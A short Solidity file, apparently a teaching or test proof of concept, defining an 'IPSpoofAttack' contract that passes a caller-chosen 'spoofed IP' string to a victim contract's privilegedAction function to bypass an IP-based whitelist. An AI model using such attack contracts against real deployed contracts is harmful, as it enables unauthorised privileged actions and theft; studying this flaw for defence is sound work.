pragma solidity ^0.8.21;

interface NodeWhitelist {
    function privilegedAction(string memory fakeIP) external;
}

contract IPSpoofAttack {
    NodeWhitelist public victimContract;

    constructor(address _victimContract) {
        victimContract = NodeWhitelist(_victimContract);
    }

    function spoofAndAttack(string memory spoofedIP) external {
        victimContract.privilegedAction(spoofedIP);
    }
}
